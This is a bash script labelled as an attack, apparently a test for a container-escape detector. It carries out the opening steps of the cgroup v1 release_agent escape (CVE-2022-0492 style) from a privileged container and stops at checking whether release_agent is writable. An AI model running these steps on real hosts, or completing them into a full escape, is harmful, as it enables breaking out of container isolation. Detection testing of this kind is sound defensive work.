#!/bin/bash
# ATTACK 3 — Cgroup Release Agent Escape (CVE-2022-0492 style)
# From a privileged container, mount cgroup v1, create a child cgroup,
# and verify the release_agent escape path is open.
set -e

echo "=== ATTACK 3: Cgroup Release Agent Escape ==="
echo "PID: $$  Container: $(hostname)"
echo ""

CGROUP_MNT="/tmp/cgroup_escape"
CGROUP_CHILD="${CGROUP_MNT}/escape_test"

# Step 1: Mount cgroup v1 controller
echo "[*] Mounting cgroup memory controller..."
mkdir -p "$CGROUP_MNT"
if mount -t cgroup -o memory cgroup "$CGROUP_MNT" 2>/dev/null; then
    echo "[!] Mounted cgroup controller at $CGROUP_MNT"
else
    echo "[-] Cannot mount cgroup (cgroupv2 only or unprivileged)"
fi

# Step 2: Create child cgroup
echo "[*] Creating child cgroup..."
if mkdir -p "$CGROUP_CHILD" 2>/dev/null; then
    echo "[+] Created child cgroup: $CGROUP_CHILD"
fi

# Step 3: Check notify_on_release
echo "[*] Checking notify_on_release..."
if [ -f "$CGROUP_CHILD/notify_on_release" ]; then
    echo 1 > "$CGROUP_CHILD/notify_on_release" 2>/dev/null && \
        echo "[!] Set notify_on_release = 1" || \
        echo "[-] Cannot write notify_on_release"
else
    echo "[-] notify_on_release not found"
fi

# Step 4: Check release_agent
echo "[*] Checking release_agent..."
if [ -f "$CGROUP_MNT/release_agent" ]; then
    [ -w "$CGROUP_MNT/release_agent" ] && \
        echo "[!] VULN — release_agent is writable (host code execution possible)" || \
        echo "[+] release_agent not writable"
else
    echo "[-] release_agent not found"
fi

# Cleanup
rmdir "$CGROUP_CHILD" 2>/dev/null || true
umount "$CGROUP_MNT" 2>/dev/null || true
rmdir "$CGROUP_MNT" 2>/dev/null || true

echo ""
echo "=== Attack complete — check detector for CGROUP-ESCAPE alerts ==="
